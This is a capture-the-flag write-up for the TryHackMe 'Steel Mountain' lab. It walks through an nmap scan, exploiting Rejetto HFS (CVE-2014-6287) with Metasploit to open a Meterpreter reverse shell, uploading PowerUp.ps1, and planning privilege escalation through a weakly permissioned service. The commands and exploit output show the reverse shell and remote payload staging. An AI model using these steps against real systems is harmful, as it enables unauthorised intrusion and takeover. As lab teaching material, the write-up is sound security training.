# THM - Steel Mountain Write-Up

In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

The first step I always find useful is creating a directory for the room, and opening a terminal as root at the location (/home/kali/Desktop/CTF/TryHackMe/SteelMountain/).

## Task 1 : Introduction

1. Who is the employee of the month?

I am going to start this CTF by running a nmap scan on my assigned MACHINE_IP for this room. I will be looking for open ports that may have vulnerabilities so that I can take advantage of them using Metasploit.

```linux
nmap 10.10.98.28 -p- -A -vv
```

The scan I chose to run looks at all ports and runs an aggressive scan with very verbose information. It can sometimes be useful to output this in a grepable format by adding -oG file.

Here is what I managed to find with my scan that I believe will be useful:

2. Operating System: Windows Server 2008 R2 - 2012
2. Interesting open ports:
* 8080 (HttpFileServer httpd 2.3)
* 3389 (RDP)
* 80 (HTTP)
* 445 (SMB)
* 139 (SMB)
* 135 (MSRPC)

After seeing the ports, I am going to start by checking out the website on port 80 to see if it has any information on employees.

After navigating to 10.10.98.28 to view the site, we see that we're in luck! Kind of... We see the employee but there is no name! Usually I would recommend doing some OSINT using a [Reverse Image Search](http://imgops.com/) here to try and find more info, but let's check the source first. 

Bingo! We got the answer for #1. It is common for information to be given away in the name of image files.

```html
<img src="/img/BillHarper.png" style="width:200px;height:200px;"/>
```

## Task 2 : Initial Access

3. Scan the machine with nmap. What is the other port running a web server on?

We already found this file server in Task 1.

3. Take a look at the other web server. What file server is running?

Our nmap revealed that this was HttpFileServer httpd 2.3. We still need to find the vendor though. Let's navigate to the MACHINE_IP:8080 and see if we can find it in the source. It looks this is a Rejetto HTTP File Server (HFS) using httpd 2.3.

```html
<a href="http://www.rejetto.com/hfs/">HttpFileServer 2.3</a>
```

3. What is the CVE number to exploit this file server?

This could be a point of initial access. Let's check [Exploit-DB](https://www.exploit-db.com/) with the information we now have.
Looks like we can use Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) AKA [CVE-2014-6287](https://www.exploit-db.com/exploits/39161)

3. Use Metasploit to get an initial shell. What is the user flag?
Looks like it's time to hop over to Metasploit and get a shell on this server!

Lets go back to that root console we opened earlier and run the following to open the metasploit console and search for an exploit to get a shell.

```linux
msfconsole
search rejetto
[*] Using exploit/windows/http/rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

use rejetto
show options
```

After running the above commands, check and see what options are needed to launch this exploit.

I see that the payload LHOST needs to be changed to my tun0 TryHackMe OpenVPN IP, the RPORT needs to be shifted from 80 to 8080, and the RHOSTS needs to be set to the MACHINE_IP.

After setting all the options using SET OPTION VALUE, run exploit and see if you can get a shell.

```linux
[*] Started reverse TCP handler on 10.6.40.191:4444 
[*] Using URL: http://0.0.0.0:8080/uZLdlnYXXTAxk
[*] Local IP: http://10.0.2.15:8080/uZLdlnYXXTAxk
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /uZLdlnYXXTAxk
[*] Sending stage (175174 bytes) to 10.10.98.28
[*] Meterpreter session 1 opened (10.6.40.191:4444 -> 10.10.98.28:49288) at 2021-02-14 04:00:06 -0500
[!] Tried to delete %TEMP%\vKBVgSnUET.vbs, unknown result
[*] Server stopped.

meterpreter > 
```

SUCCESS! Let's now run a quick ls -a to see where we are and what's in the directory.

Unfortunately, I do not see any txt flags here and we appear to be in the startup directory.  So let's fix that by navigating to the Users directory.

```linux
cd \Users\
```

You could probably assume the user is bill but lets run an ls here to see the different users, since we will want to know of any admin accounts.

Notable Users:
* Bill
* Administrator

Let's now cd to bill and check his desktop/documents for the flag.

Looks like user.txt is located on the desktop. Go ahead and cat it to get the flag.

## Task 3 : Priviledge Escalation

Now we are going to need the powershell script [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). The script's purpose is for evaluatuating a Windows machine and determining abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."

Let's background our meterpreter session (background) and open up another terminal session as root in our steel mountain directory. 

We can use curl to download the raw file of this powershell.

```linux
curl -O -L https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```

Now we need to upload PowerUp to the server. Luckily, we already have a backgrounded shell. First, make sure that your meterpreter is in the directory of your PowerUp that you will be uploading with ls.

You can then open up the session for your shell that you backgrounded.

```linux
msf6 exploit(windows/http/rejetto_hfs_exec) > sessions -1
[*] Starting interaction with 1...

meterpreter > upload PowerUp.ps1
[*] uploading  : PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : PowerUp.ps1 -> PowerUp.ps1
```

Now we must load the powershell extension and enter into the shell.

```linux
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > 
```

4. Take close attention to the **CanRestart** option that is set to true. What is the name of the name of the service which shows up as an **unquoted service path** vulnerability?

Now that we have successfully launched powershell, lets run our PowerUp and Invoke-AllChecks to look for the CanRestart option being false along with the service having unqouted service paths.

```ps
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```

Looking through we can see that **AdvancedSystemCareService9** applies to both criteria we were looking for. The unquoted service could be exploited, but we're just going to abuse the weak file permissions to restart the service on the system. It's worth noting that the directory to the application is also write-able. Now we can just swap the actual application with our malicious version, restart the service, and run it get root.

4. What is the root flag?
